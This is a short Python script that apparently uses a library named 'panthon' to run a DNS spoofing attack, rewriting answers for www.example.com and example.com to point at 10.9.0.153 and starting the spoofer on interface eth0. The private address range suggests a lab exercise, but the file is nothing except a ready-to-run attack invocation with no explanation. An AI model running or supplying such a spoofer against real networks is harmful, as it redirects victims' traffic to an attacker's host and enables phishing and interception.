from panthon import DNSSpoofer

spoofing_rules = {
    "www.example.com.": "10.9.0.153",
    "example.com.": "10.9.0.153" 
}

spoofer = DNSSpoofer('eth0', spoofing_rules)  # Adjust interface as needed
spoofer.start()